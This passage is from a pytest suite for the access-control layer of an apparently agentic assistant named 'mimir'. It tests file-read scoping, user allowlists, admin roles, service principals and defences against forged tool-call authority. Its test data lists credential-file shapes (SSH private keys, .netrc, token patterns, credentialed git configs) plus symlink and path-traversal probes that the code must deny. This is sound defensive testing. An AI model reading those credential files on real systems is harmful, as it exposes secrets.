from __future__ import annotations

import asyncio
import os
import subprocess
from dataclasses import FrozenInstanceError, replace
from pathlib import Path
from textwrap import dedent
from types import SimpleNamespace

import pytest

from mimir._context import reset_current_turn, set_current_turn
from mimir.access_control import (
    HTTP_EVENT_INGRESS_EXTRA_KEY,
    AccessStatus,
    CapabilityTier,
    DenialReason,
    OperationCatalog,
    OperationDecision,
    ServicePrincipal,
    ServiceSinkPolicy,
    SinkGate,
    ToolRegistry,
    authorize_action,
    authorize_inbound,
    build_trigger_service_principal,
    create_auth_context,
    get_service_principal,
    parse_service_shell_argv,
)
from mimir.identities import IdentityResolver
from mimir.models import (
    AgentEvent,
    AuthContext,
    InformationFlowLabels,
    SessionACL,
    SourceLabel,
    TurnContext,
    TurnInteractivity,
)


def _resolver(tmp_path: Path, body: str) -> IdentityResolver:
    state = tmp_path / "state"
    state.mkdir(exist_ok=True)
    (state / "identities.yaml").write_text(dedent(body), encoding="utf-8")
    resolver = IdentityResolver(home=tmp_path)
    resolver.reload()
    return resolver


def _event(author: str | None) -> AgentEvent:
    return AgentEvent(
        trigger="user_message",
        channel_id="slack-C1",
        author=author,
        content="hello",
    )


READ_RESOURCE_TOOLS = (
    "read_file", "aread", "ls", "als", "glob", "aglob", "grep", "agrep",
    "file_search", "get_turn", "mimir_get_turn",
)


def _read_auth(*, admin: bool = False) -> AuthContext:
    return AuthContext(
        principal="slack-U1",
        canonical_principal="alice",
        roles=("user", "admin") if admin else ("user",),
        event_ingress=None,
        trigger="user_message",
        channel_id="slack-C1",
        interactivity=None,
        enforcement_enabled=True,
    )


@pytest.mark.parametrize("tool_name", READ_RESOURCE_TOOLS)
def test_read_operations_are_cataloged_resource_scoped(tool_name: str) -> None:
    assert OperationCatalog().get_decision(tool_name) == OperationDecision.RESOURCE_SCOPED


@pytest.mark.parametrize("root_kind", ["repo", "tmp", "state"])
def test_non_admin_read_allows_configured_scopes(
    root_kind: str, tmp_path: Path, monkeypatch: pytest.MonkeyPatch,
) -> None:
    home = tmp_path / "home"
    state = home / "state"
    repo = tmp_path / "repo"
    state.mkdir(parents=True)
    repo.mkdir()
    monkeypatch.setenv("MIMIR_HOME", str(home))
    monkeypatch.setenv("MIMIR_FILE_TOOL_ROOTS", f"{repo}:ro")
    roots = {"repo": repo, "tmp": Path("/tmp"), "state": state}
    target = roots[root_kind] / f"mimir-read-scope-{tmp_path.name}.txt"
    target.write_text("safe\n", encoding="utf-8")
    try:
        result = ToolRegistry().authorize_tool(
            "read_file", _read_auth(), enforce=True,
            arguments={"file_path": str(target)},
        )
    finally:
        if root_kind == "tmp":
            target.unlink(missing_ok=True)

    assert result.allowed is True
    assert result.decision == OperationDecision.RESOURCE_SCOPED


def test_non_admin_virtual_and_real_state_paths_resolve_identically(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch,
) -> None:
    home = tmp_path / "home"
    target = home / "state" / "liveness.json"
    target.parent.mkdir(parents=True)
    target.write_text('{"alive": true}\n', encoding="utf-8")
    monkeypatch.setenv("MIMIR_HOME", str(home))

    registry = ToolRegistry()
    decisions = [
        registry.authorize_tool(
            "read_file", _read_auth(), enforce=True,
            arguments={"file_path": path},
        )
        for path in ("/state/liveness.json", str(target))
    ]

    assert [decision.allowed for decision in decisions] == [True, True]
    assert [decision.decision for decision in decisions] == [
        OperationDecision.RESOURCE_SCOPED,
        OperationDecision.RESOURCE_SCOPED,
    ]


@pytest.mark.parametrize("path", ["/memory/core/profile.md", "/logs/agent.log"])
def test_non_admin_virtual_non_state_home_paths_remain_denied(
    path: str, tmp_path: Path, monkeypatch: pytest.MonkeyPatch,
) -> None:
    home = tmp_path / "home"
    target = home / path.lstrip("/")
    target.parent.mkdir(parents=True)
    target.write_text("private\n", encoding="utf-8")
    monkeypatch.setenv("MIMIR_HOME", str(home))

    result = ToolRegistry().authorize_tool(
        "read_file", _read_auth(), enforce=True,
        arguments={"file_path": path},
    )

    assert result.allowed is False
    assert result.reason == "read_scope"


def test_non_admin_virtual_state_protected_and_symlink_targets_remain_denied(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch,
) -> None:
    home = tmp_path / "home"
    state = home / "state"
    outside = tmp_path / "outside"
    state.mkdir(parents=True)
    outside.mkdir()
    (state / "secrets.json").write_text("{}\n", encoding="utf-8")
    (outside / "safe.txt").write_text("outside\n", encoding="utf-8")
    (state / "escape").symlink_to(outside, target_is_directory=True)
    monkeypatch.setenv("MIMIR_HOME", str(home))

    registry = ToolRegistry()
    for path in ("/state/secrets.json", "/state/escape/safe.txt"):
        result = registry.authorize_tool(
            "read_file", _read_auth(), enforce=True,
            arguments={"file_path": path},
        )
        assert result.allowed is False
        assert result.reason == "read_scope"


def test_read_capable_service_principal_uses_declared_grant_for_repo_path(
    tmp_path: Path,
) -> None:
    repo = tmp_path / "repo"
    repo.mkdir()
    service = ServicePrincipal(
        canonical="poller:test",
        trigger="poller",
        capabilities=("read_file",),
        readable_domains=("filesystem",),
    )
    auth = _service_auth(service, InformationFlowLabels())

    result = ToolRegistry().authorize_tool(
        "read_file", auth, enforce=True,
        arguments={"file_path": str(repo / "not-yet-created.txt")},
    )

    assert result.allowed is True
    assert result.service_principal is service


@pytest.mark.parametrize(
    "relative",
    [".", ".env", "compose.env", "config/settings.toml", ".mimir/saga.db", "state/identities.yaml"],
)
def test_non_admin_read_denies_home_and_protected_surfaces(
    relative: str, tmp_path: Path, monkeypatch: pytest.MonkeyPatch,
) -> None:
    home = tmp_path / "home"
    (home / "state").mkdir(parents=True)
    target = home / relative
    if relative != ".":
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_text("sensitive\n", encoding="utf-8")
    monkeypatch.setenv("MIMIR_HOME", str(home))

    result = ToolRegistry().authorize_tool(
        "read_file", _read_auth(), enforce=True,
        arguments={"file_path": str(target)},
    )

    assert result.allowed is False
    assert result.reason == "read_scope"


def test_non_admin_direct_read_denies_secret_content_and_operator_secret_file(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch,
) -> None:
    home = tmp_path / "home"
    repo = tmp_path / "repo"
    (home / "state").mkdir(parents=True)
    repo.mkdir()
    content_secret = repo / "notes.txt"
    content_secret.write_text("ghp_" + "a" * 30, encoding="utf-8")
    declared_secret = repo / "servers.json"
    declared_secret.write_text("{}", encoding="utf-8")
    monkeypatch.setenv("MIMIR_HOME", str(home))
    monkeypatch.setenv("MIMIR_FILE_TOOL_ROOTS", f"{repo}:ro")
    monkeypatch.setenv("MIMIR_MCP_SERVERS_PATH", str(declared_secret))

    registry = ToolRegistry()
    for target in (content_secret, declared_secret):
        result = registry.authorize_tool(
            "read_file", _read_auth(), enforce=True,
            arguments={"file_path": str(target)},
        )
        assert result.allowed is False


@pytest.mark.parametrize("root_kind", ["repo", "tmp"])
@pytest.mark.parametrize(
    ("relative", "content"),
    [
        ("secrets.yaml", "value: placeholder\n"),
        ("secrets.yml", "value: placeholder\n"),
        ("secrets.json", "{}\n"),
        ("id_rsa", "placeholder\n"),
        ("id_ed25519", "placeholder\n"),
        ("id_ecdsa", "placeholder\n"),
        ("id_dsa", "placeholder\n"),
        (".netrc", "machine example.invalid\n"),
        (".pypirc", "[distutils]\n"),
        (".npmrc", "registry=https://example.invalid/\n"),
        ("notes.txt", "-----BEGIN OPENSSH PRIVATE KEY-----\nplaceholder\n"),
        (".git/config", "url = https://alice:placeholder@example.invalid/repo.git\n"),
    ],
)
def test_non_admin_read_denies_additional_secret_shapes_in_repo_and_tmp(
    root_kind: str,
    relative: str,
    content: str,
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    home = tmp_path / "home"
    repo = tmp_path / "repo"
    tmp_root = tmp_path / "tmp-read-root"
    (home / "state").mkdir(parents=True)
    repo.mkdir()
    tmp_root.mkdir()
    target = (repo if root_kind == "repo" else tmp_root) / relative
    target.parent.mkdir(parents=True, exist_ok=True)
    target.write_text(content, encoding="utf-8")
    monkeypatch.setenv("MIMIR_HOME", str(home))
    monkeypatch.setenv("MIMIR_FILE_TOOL_ROOTS", f"{repo}:ro")

    result = ToolRegistry().authorize_tool(
        "read_file", _read_auth(), enforce=True,
        arguments={"file_path": str(target)},
    )

    assert result.allowed is False
    assert result.reason == "read_scope"


def test_non_admin_read_allows_git_config_without_basic_auth(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch,
) -> None:
    home = tmp_path / "home"
    repo = tmp_path / "repo"
    (home / "state").mkdir(parents=True)
    config = repo / ".git" / "config"
    config.parent.mkdir(parents=True)
    config.write_text("url = https://example.invalid/repo.git\n", encoding="utf-8")
    monkeypatch.setenv("MIMIR_HOME", str(home))
    monkeypatch.setenv("MIMIR_FILE_TOOL_ROOTS", f"{repo}:ro")

    result = ToolRegistry().authorize_tool(
        "read_file", _read_auth(), enforce=True,
        arguments={"file_path": str(config)},
    )

    assert result.allowed is True


@pytest.mark.parametrize("tool_name", ["ls", "glob", "grep"])
def test_non_admin_collection_auth_allows_home_root_as_state_routing_node(
    tool_name: str, tmp_path: Path, monkeypatch: pytest.MonkeyPatch,
) -> None:
    home = tmp_path / "home"
    (home / "state").mkdir(parents=True)
    monkeypatch.setenv("MIMIR_HOME", str(home))

    result = ToolRegistry().authorize_tool(
        tool_name, _read_auth(), enforce=True,
        arguments={"path": str(home), "pattern": "needle"},
    )

    assert result.allowed is True
    assert result.decision == OperationDecision.RESOURCE_SCOPED


def test_non_admin_collection_auth_resolves_only_root_without_walking(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch,
) -> None:
    home = tmp_path / "home"
    repo = tmp_path / "repo"
    (home / "state").mkdir(parents=True)
    repo.mkdir()
    (repo / "secret.txt").write_text("ghp_" + "a" * 30, encoding="utf-8")
    monkeypatch.setenv("MIMIR_HOME", str(home))
    monkeypatch.setenv("MIMIR_FILE_TOOL_ROOTS", f"{repo}:ro")
    monkeypatch.setattr(Path, "iterdir", lambda _self: pytest.fail("authz walked tree"))
    monkeypatch.setattr(Path, "rglob", lambda _self, _pattern: pytest.fail("authz walked tree"))

    result = ToolRegistry().authorize_tool(
        "grep", _read_auth(), enforce=True,
        arguments={"path": str(repo), "pattern": "needle"},
    )

    assert result.allowed is True


def test_read_scope_denies_relative_missing_and_symlink_escape_but_admin_is_unaffected(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch,
) -> None:
    home = tmp_path / "home"
    repo = tmp_path / "repo"
    outside = tmp_path / "outside"
    (home / "state").mkdir(parents=True)
    repo.mkdir()
    outside.mkdir()
    secret = outside / "secret.txt"
    secret.write_text("outside", encoding="utf-8")
    (repo / "escape").symlink_to(outside, target_is_directory=True)
    monkeypatch.setenv("MIMIR_HOME", str(home))
    monkeypatch.setenv("MIMIR_FILE_TOOL_ROOTS", f"{repo}:ro")

    registry = ToolRegistry()
    targets = (
        "relative.txt",
        repo / "missing.txt",
        repo / ".." / "outside" / "secret.txt",
        repo / "escape" / "secret.txt",
    )
    for target in targets:
        denied = registry.authorize_tool(
            "read_file", _read_auth(), enforce=True,
            arguments={"file_path": str(target)},
        )
        assert denied.allowed is False

    admin = registry.authorize_tool(
        "read_file", _read_auth(admin=True), enforce=True,
        arguments={"file_path": str(secret)},
    )
    assert admin.allowed is True


def test_worklink_repo_sink_adapter_matches_configured_repo(
    monkeypatch: pytest.MonkeyPatch,
    tmp_path: Path,
) -> None:
    import mimir.access_control as access_control

    configured = tmp_path / "repo"
    configured.mkdir()
    other = tmp_path / "other"
    other.mkdir()

    monkeypatch.delenv("WORKLINK_REPO", raising=False)
    monkeypatch.delenv("MIMIR_WORKLINK_REPO", raising=False)
    assert access_control._target_matches_worklink_repo(str(configured), "unused") is False

    monkeypatch.setenv("WORKLINK_REPO", str(configured))
    assert access_control._target_matches_worklink_repo(str(configured), "unused") is True
    assert access_control._target_matches_worklink_repo(str(other), "unused") is False


def test_heartbeat_builtin_tier_covers_unbounded_fetch_url(tmp_path: Path) -> None:
    import mimir.access_control as access_control

    principal = access_control.builtin_trigger_service_principal("heartbeat", tmp_path)

    assert principal.capability_tier is access_control.CapabilityTier.UNBOUNDED
    assert "fetch_url" in principal.capabilities
    assert principal.sink_policy_for("shell_exec") == access_control.ServiceSinkPolicy(
        "shell_exec", "shell_profile", "maintenance",
    )


@pytest.mark.parametrize("tool_name", ["write_file", "edit_file"])
def test_heartbeat_write_allows_safe_home_memory_and_state(
    tool_name: str,
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    import mimir.access_control as access_control

    home = tmp_path / "home"
    (home / "state").mkdir(parents=True)
    (home / "memory").mkdir()
    monkeypatch.setenv("MIMIR_HOME", str(home))
    principal = access_control.builtin_trigger_service_principal("heartbeat", home)
    auth = _service_auth(principal, InformationFlowLabels())

    for target in (
        home / "memory" / "issues" / "x.md",
        home / "state" / "reports" / "x.md",
    ):
        decision = ToolRegistry().authorize_tool(
            tool_name, auth, enforce=True, target_channel=str(target),
        )
        assert decision.allowed is True, target


def test_inventory_assertion_rejects_uncataloged_deepagents_builtin(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    import mimir.access_control as access_control

    monkeypatch.setattr(
        access_control,
        "_deepagents_builtin_tool_names",
        lambda: ("synthetic_deepagents_builtin",),
    )

    with pytest.raises(
        access_control.CapabilityMatrixError,
        match="UNKNOWN model-bound tools: synthetic_deepagents_builtin",
    ):
        access_control.assert_model_tool_inventory_cataloged(model_spec="openai:test")


def test_inventory_assertion_rejects_uncataloged_registered_mcp_tool() -> None:
    from mimir.access_control import (
        CapabilityMatrixError,
        assert_model_tool_inventory_cataloged,
    )
    from mimir.tools.mcp import clear_mcp_tools, set_mcp_tools

    set_mcp_tools([SimpleNamespace(name="mcp_synthetic_uncataloged")])
    try:
        with pytest.raises(
            CapabilityMatrixError,
            match="without explicit IFC flow metadata: mcp_synthetic_uncataloged",
        ):
            assert_model_tool_inventory_cataloged(model_spec="openai:test")
    finally:
        clear_mcp_tools()


def test_inbound_allows_allowlisted_user_when_enforced(tmp_path: Path) -> None:
    resolver = _resolver(
        tmp_path,
        """
        people:
          - canonical: alice
            aliases: [slack-U1]
            access: {roles: [user]}
        """,
    )

    decision = authorize_inbound(_event("slack-U1"), resolver, enforce=True)

    assert decision.allowed is True
    assert decision.status == AccessStatus.USER_ALLOWED
    assert decision.denial_reason is None
    assert decision.canonical_author == "alice"
    assert decision.roles == ("user",)


def test_inbound_distinguishes_known_non_allowlisted_from_unknown(
    tmp_path: Path,
) -> None:
    resolver = _resolver(
        tmp_path,
        """
        people:
          - canonical: alice
            aliases: [slack-U1]
        """,
    )

    known = authorize_inbound(_event("slack-U1"), resolver, enforce=True)
    unknown = authorize_inbound(_event("slack-U2"), resolver, enforce=True)

    assert known.allowed is False
    assert known.status == AccessStatus.DENIED
    assert known.reason == DenialReason.USER_NOT_ALLOWLISTED
    assert known.canonical_author == "alice"
    assert unknown.allowed is False
    assert unknown.reason == DenialReason.UNKNOWN_AUTHOR
    assert unknown.canonical_author == "slack-U2"


def test_admin_action_requires_admin_role(tmp_path: Path) -> None:
    resolver = _resolver(
        tmp_path,
        """
        people:
          - canonical: alice
            aliases: [slack-U1]
            access: {roles: [user]}
          - canonical: root
            aliases: [slack-UADMIN]
            access: {roles: [user, admin]}
        """,
    )

    user = authorize_action(_event("slack-U1"), resolver, admin=True, enforce=True)
    admin = authorize_action(_event("slack-UADMIN"), resolver, admin=True, enforce=True)

    assert user.allowed is False
    assert user.reason == DenialReason.ADMIN_REQUIRED
    assert admin.allowed is True
    assert admin.status == AccessStatus.ADMIN_ALLOWED
    assert admin.reason is None


def test_admin_action_follows_canonical_aliases_across_slack_discord(
    tmp_path: Path,
) -> None:
    resolver = _resolver(
        tmp_path,
        """
        people:
          - canonical: root
            aliases: [slack-UADMIN, discord-42]
            access: {roles: [user, admin]}
        """,
    )

    slack = authorize_action("slack-UADMIN", resolver, admin=True, enforce=True)
    discord = authorize_action("discord-42", resolver, admin=True, enforce=True)

    assert slack.allowed is True
    assert discord.allowed is True
    assert slack.canonical_author == "root"
    assert discord.canonical_author == "root"
    assert slack.roles == ("user", "admin")
    assert discord.roles == ("user", "admin")


@pytest.mark.parametrize(
    "tool_name",
    [
        "memory_store",
        "memory_query",
        "memory_get",
        "saga_feedback",
        "saga_mark_contributions",
        "saga_end_session",
        "saga_record_skill_learning",
        "bash_jobs_list",
        "bash_job_output",
        "write_todos",
        "defer_injected_message",
        "commitment_complete",
        "commitment_snooze",
        "commitment_dismiss",
    ],
)
def test_admin_turn_can_use_routine_cataloged_tools_when_enforced(
    tool_name: str,
) -> None:
    auth = AuthContext(
        principal="slack-UADMIN",
        canonical_principal="root",
        roles=("user", "admin"),
        event_ingress=None,
        trigger="user_message",
        channel_id="slack-C1",
        interactivity=None,
        enforcement_enabled=True,
        domain="channel",
        resource_id="slack-C1",
        bridge_instance="slack",
    )

    result = ToolRegistry().authorize_tool(
        tool_name,
        auth,
        enforce=True,
        ifc_labels=InformationFlowLabels(),
    )

    assert result.allowed is True
    assert result.decision is not OperationDecision.UNKNOWN
    assert result.reason is None


@pytest.mark.asyncio
@pytest.mark.parametrize(
    ("tool_name", "service_trigger", "service_principal"),
    [
        ("list_channels", "poller", "poller"),
        ("list_schedules", "upgrade", "system"),
        ("bash_jobs_list", "scheduled_tick", "scheduler"),
    ],
)
@pytest.mark.parametrize(
    ("caller", "should_render"),
    [
        ("regular", False),
        ("admin", True),
        ("service", True),
        ("missing", False),
        ("http", False),
    ],
)
async def test_protected_metadata_reads_authorize_before_rendering(
    monkeypatch: pytest.MonkeyPatch,
    tool_name: str,
    service_trigger: str,
    service_principal: str,
    caller: str,
    should_render: bool,
) -> None:
    from langchain_core.messages import ToolMessage

    from mimir.tools.budget_gate import BudgetGateMiddleware

    monkeypatch.setenv("MIMIR_ACCESS_CONTROL_ENFORCED", "true")
    monkeypatch.setattr(
        "mimir.tools.budget_gate._emit_event_sync", lambda *_args, **_kwargs: None
    )
    if caller == "service":
        auth_context = create_auth_context(
            AgentEvent(
                trigger=service_trigger,
                channel_id=f"{service_trigger}:test",
                service_principal=service_principal,
            ),
            enforce=True,
        )
        if service_trigger == "poller":
            should_render = False  # the removed generic poller principal grants nothing
    elif caller == "missing":
        auth_context = None
    else:
        auth_context = AuthContext(
            principal=f"{caller}-principal",
            canonical_principal=caller,
            roles=("user", "admin") if caller in {"admin", "http"} else ("user",),
            event_ingress="http_event" if caller == "http" else None,
            trigger="user_message",
            channel_id="slack-C1",
            interactivity=None,
            enforcement_enabled=True,
        )

    protected_result = f"protected-metadata:{tool_name}"
    handler_calls = 0

    async def handler(request):
        nonlocal handler_calls
        handler_calls += 1
        return ToolMessage(
            content=protected_result,
            tool_call_id=request.tool_call["id"],
        )

    result = await BudgetGateMiddleware().awrap_tool_call(
        _tool_request(auth_context, tool_name=tool_name, args={}), handler
    )

    assert handler_calls == int(should_render)
    if should_render:
        assert result.status != "error"
        assert result.content == protected_result
    else:
        assert result.status == "error"
        assert protected_result not in str(result.content)


def test_legacy_default_allows_but_reports_would_deny_reason(
    tmp_path: Path,
) -> None:
    resolver = _resolver(
        tmp_path,
        """
        people:
          - canonical: alice
            aliases: [slack-U1]
        """,
    )

    decision = authorize_inbound(_event("slack-U1"), resolver)

    assert decision.allowed is True
    assert decision.status == AccessStatus.LEGACY_ALLOWED
    assert decision.reason == DenialReason.USER_NOT_ALLOWLISTED
    assert decision.enforcement_enabled is False


def test_missing_resolver_preserves_single_operator_legacy_behavior() -> None:
    decision = authorize_action(_event("slack-U1"), None, admin=True)

    assert decision.allowed is True
    assert decision.status == AccessStatus.LEGACY_ALLOWED
    assert decision.reason == DenialReason.USER_NOT_ALLOWLISTED
    assert decision.canonical_author == "slack-U1"


def test_missing_author_has_stable_denial_reason_when_enforced() -> None:
    decision = authorize_inbound(_event(None), None, enforce=True)

    assert decision.allowed is False
    assert decision.status == AccessStatus.DENIED
    assert decision.denial_reason == "missing_author"


def test_log_fields_are_stable_string_values(tmp_path: Path) -> None:
    resolver = _resolver(
        tmp_path,
        """
        people:
          - canonical: alice
            aliases: [slack-U1]
            access: {roles: [user]}
        """,
    )

    fields = authorize_action(
        "slack-U1",
        resolver,
        admin=True,
        enforce=True,
    ).as_log_fields()

    assert fields == {
        "allowed": False,
        "status": "denied",
        "required_tier": "admin",
        "denial_reason": "admin_required",
        "author": "slack-U1",
        "canonical_author": "alice",
        "roles": ["user"],
        "enforcement_enabled": True,
    }


def test_auth_context_frozen_is_immutable(tmp_path: Path) -> None:
    """Verify AuthContext is frozen and cannot be mutated after creation."""
    resolver = _resolver(
        tmp_path,
        """
        people:
          - canonical: alice
            aliases: [slack-U1]
            access: {roles: [user, admin]}
        """,
    )

    event = _event("slack-U1")
    auth_ctx = create_auth_context(event, resolver)

    assert auth_ctx is not None
    assert auth_ctx.principal == "slack-U1"
    assert auth_ctx.canonical_principal == "alice"
    assert auth_ctx.roles == ("user", "admin")
    assert auth_ctx.is_service is False

    with pytest.raises(FrozenInstanceError):
        auth_ctx.roles = ("user", "admin", "service")
    with pytest.raises(FrozenInstanceError):
        auth_ctx.enforcement_enabled = True


def test_auth_context_carries_ingress_provenance(tmp_path: Path) -> None:
    """Verify AuthContext captures server-owned ingress metadata."""
    resolver = _resolver(
        tmp_path,
        """
        people:
          - canonical: alice
            aliases: [slack-U1]
            access: {roles: [user]}
        """,
    )

    event = AgentEvent(
        trigger="user_message",
        channel_id="slack-C1",
        author="slack-U1",
        content="hello",
        extra={HTTP_EVENT_INGRESS_EXTRA_KEY: "http-api"},
    )
    auth_ctx = create_auth_context(event, resolver)

    assert auth_ctx is not None
    assert auth_ctx.event_ingress == "http-api"
    assert auth_ctx.trigger == "user_message"
    assert auth_ctx.channel_id == "slack-C1"


def test_auth_context_service_identity(tmp_path: Path) -> None:
    """Verify AuthContext captures service identity from identity resolver."""
    resolver = _resolver(
        tmp_path,
        """
        people:
          - canonical: mcp-service
            aliases: [mcp-1]
            access: {roles: [service], is_service: true}
        """,
    )

    event = _event("mcp-1")
    auth_ctx = create_auth_context(event, resolver)

    assert auth_ctx is not None
    assert auth_ctx.is_service is True
    assert "service" in auth_ctx.roles


def test_service_only_identity_does_not_get_user_inbound_access(tmp_path: Path) -> None:
    """Service classification alone must not widen USER-tier policy."""
    resolver = _resolver(
        tmp_path,
        """
        people:
          - canonical: external-service
            aliases: [service-external]
            access: {roles: [service], is_service: true}
          - canonical: trusted-service-user
            aliases: [service-trusted]
            access: {roles: [service, user], is_service: true}
        """,
    )

    external = authorize_inbound(_event("service-external"), resolver, enforce=True)
    trusted = authorize_inbound(_event("service-trusted"), resolver, enforce=True)

    assert external.allowed is False
    assert external.reason == DenialReason.USER_NOT_ALLOWLISTED
    assert external.roles == ("service",)
    assert trusted.allowed is True
    assert trusted.status == AccessStatus.USER_ALLOWED
    assert trusted.roles == ("service", "user")


def test_http_ingress_extra_key_blocks_service_grant() -> None:
    """Verify that HTTP ingress via extra[HTTP_EVENT_INGRESS_EXTRA_KEY] blocks service authority.

    This is a defense-in-depth check: even when an event matches a registered
    service principal (trigger + canonical), if it came via HTTP ingress
    (detected via the canonical extra key), service authority should NOT be granted.
    """
    event = AgentEvent(
        trigger="scheduled_tick",
        channel_id="scheduler:test",
        service_principal="scheduler",
        extra={HTTP_EVENT_INGRESS_EXTRA_KEY: "http-api"},
    )

    auth_ctx = create_auth_context(event, enforce=True)

    assert auth_ctx.event_ingress is not None, "HTTP ingress should be detected from extra"
    assert auth_ctx.is_service is False, "Service authority should NOT be granted for HTTP ingress"


def _source_session_acl() -> SessionACL:
    return SessionACL(
        owner_principal="alice",
        origin_channel="discord-dm",
        origin_domain="discord",
        visibility="private",
        provenance_complete=True,
    )


def test_source_session_acl_carried_only_for_trusted_internal_synthesis() -> None:
    acl = _source_session_acl()
    event = AgentEvent(
        trigger="saga_session_end",
        channel_id="discord-dm",
        service_principal="synthesis",
        source_session_acl=acl,
    )

    context = create_auth_context(event, enforce=True)

    assert context.is_service is True
    assert context.source_session_acl == acl


@pytest.mark.parametrize(
    ("trigger", "service_principal", "extra", "event_ingress"),
    [
        ("scheduled_tick", "scheduler", {}, None),
        (
            "saga_session_end",
            "synthesis",
            {HTTP_EVENT_INGRESS_EXTRA_KEY: "http-api"},
            None,
        ),
        ("saga_session_end", "scheduler", {}, None),
        ("unknown_synthesis", "synthesis", {}, None),
        ("saga_session_end", "synthesis", {}, "http-api"),
    ],
)
def test_source_session_acl_rejects_untrusted_carriage(
    trigger: str,
    service_principal: str,
    extra: dict[str, str],
    event_ingress: str | None,
) -> None:
    event = AgentEvent(
        trigger=trigger,
        channel_id="discord-dm",
        service_principal=service_principal,
        source_session_acl=_source_session_acl(),
        extra=extra,
    )

    context = create_auth_context(event, enforce=True, event_ingress=event_ingress)

    assert context.source_session_acl is None


def _turn(turn_id: str, saga_session_id: str, auth_context: AuthContext) -> TurnContext:
    return TurnContext(
        turn_id=turn_id,
        session_id=turn_id,
        saga_session_id=saga_session_id,
        trigger="user_message",
        channel_id=auth_context.channel_id,
        started_at=0.0,
        auth_context=auth_context,
        access_control_enforced=True,
    )


def _tool_request(
    auth_context: object | None,
    *,
    session_id: str = "forged",
    tool_name: str = "shell_exec",
    args: dict[str, object] | None = None,
):
    from langchain.agents.middleware import ToolCallRequest
    from langgraph.runtime import Runtime

    return ToolCallRequest(
        tool_call={
            "name": tool_name,
            "args": args or {"command": "true", "session_id": session_id},
            "id": "tc-auth",
            "type": "tool_call",
        },
        tool=None,
        state=None,
        runtime=Runtime(context=auth_context),
    )


@pytest.mark.parametrize(
    "malformed_carrier",
    [
        {},
        object(),
        SimpleNamespace(
            roles=("admin",),
            enforcement_enabled=False,
            event_ingress=None,
        ),
    ],
    ids=["empty-dict", "arbitrary-object", "auth-lookalike"],
)
def test_malformed_runtime_carrier_fails_closed_under_process_enforcement(
    malformed_carrier: object,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """Only an actual AuthContext may carry authority for a tool request."""
    from langchain_core.messages import ToolMessage

    from mimir.tools.budget_gate import BudgetGateMiddleware

    monkeypatch.setenv("MIMIR_ACCESS_CONTROL_ENFORCED", "true")
    called = False

    def handler(_request):
        nonlocal called
        called = True
        return ToolMessage(content="ran", tool_call_id="tc-auth")

    result = BudgetGateMiddleware().wrap_tool_call(
        _tool_request(malformed_carrier), handler
    )

    assert called is False
    assert result.status == "error"
    assert "missing_auth_context" in str(result.content)


def test_forged_session_id_cannot_select_concurrent_admin_turn(tmp_path: Path) -> None:
    """Both principals are live; the request carrier, not model args, wins."""
    import asyncio

    from langchain_core.messages import ToolMessage

    from mimir._context import reset_current_turn, set_current_turn
    from mimir.tools.budget_gate import BudgetGateMiddleware

    resolver = _resolver(
        tmp_path,
        """
        people:
          - canonical: alice
            aliases: [slack-U1]
            access: {roles: [user]}
          - canonical: bob
            aliases: [slack-U2]
            access: {roles: [user, admin]}
        """,
    )
    alice = create_auth_context(_event("slack-U1"), resolver, enforce=True)
    bob = create_auth_context(
        AgentEvent(trigger="user_message", channel_id="slack-C2", author="slack-U2"),
        resolver,
        enforce=True,
    )
    alice_token = set_current_turn(_turn("turn-alice", "saga-alice", alice))
    bob_token = set_current_turn(_turn("turn-bob", "saga-bob", bob))
    called = False

    async def handler(_request):
        nonlocal called
        called = True
        return ToolMessage(content="ran", tool_call_id="tc-auth")

    try:
        result = asyncio.run(
            BudgetGateMiddleware().awrap_tool_call(
                _tool_request(alice, session_id="saga-bob"), handler
            )
        )
    finally:
        reset_current_turn(bob_token)
        reset_current_turn(alice_token)

    assert called is False
    assert result.status == "error"
    assert "requires an admin identity" in str(result.content)


def test_exact_request_carrier_resists_concurrent_principal_swap(tmp_path: Path) -> None:
    """An inherited/admin ContextVar cannot replace the user request carrier."""
    from mimir._context import reset_current_turn, set_current_turn
    from mimir.tools.budget_gate import _auth_context_from_request

    resolver = _resolver(
        tmp_path,
        """
        people:
          - canonical: alice
            aliases: [slack-U1]
            access: {roles: [user]}
          - canonical: bob
            aliases: [slack-U2]
            access: {roles: [admin]}
        """,
    )
    alice = create_auth_context(_event("slack-U1"), resolver, enforce=True)
    bob = create_auth_context(
        AgentEvent(trigger="user_message", channel_id="slack-C2", author="slack-U2"),
        resolver,
        enforce=True,
    )
    token = set_current_turn(_turn("turn-bob", "saga-bob", bob))
    try:
        resolved = _auth_context_from_request(_tool_request(alice))
    finally:
        reset_current_turn(token)

    assert resolved is alice
    assert resolved.canonical_principal == "alice"
    assert "admin" not in resolved.roles


def test_auth_context_ignores_mutated_resolver_and_event(tmp_path: Path) -> None:
    """Roles/provenance remain the ingress snapshot after mutable inputs change."""
    resolver = _resolver(
        tmp_path,
        """
        people:
          - canonical: alice
            aliases: [slack-U1]
            access: {roles: [user]}
        """,
    )
    event = _event("slack-U1")
    auth_context = create_auth_context(event, resolver, enforce=True)

    event.author = "slack-UADMIN"
    event.trigger = "scheduled_tick"
    event.extra["event_ingress"] = "trusted-later"
    (tmp_path / "state" / "identities.yaml").write_text(
        "people:\n  - canonical: alice\n    aliases: [slack-U1]\n"
        "    access: {roles: [user, admin]}\n",
        encoding="utf-8",
    )
    resolver.reload()

    assert auth_context.principal == "slack-U1"
    assert auth_context.trigger == "user_message"
    assert auth_context.event_ingress is None
    assert auth_context.roles == ("user",)


def test_detached_request_uses_explicit_carrier_not_inherited_context(tmp_path: Path) -> None:
    """A detached task with an inherited admin turn still honors its user carrier."""
    import asyncio

    from mimir._context import reset_current_turn, set_current_turn
    from mimir.tools.budget_gate import _auth_context_from_request

    resolver = _resolver(
        tmp_path,
        """
        people:
          - canonical: alice
            aliases: [slack-U1]
            access: {roles: [user]}
          - canonical: bob
            aliases: [slack-U2]
            access: {roles: [admin]}
        """,
    )
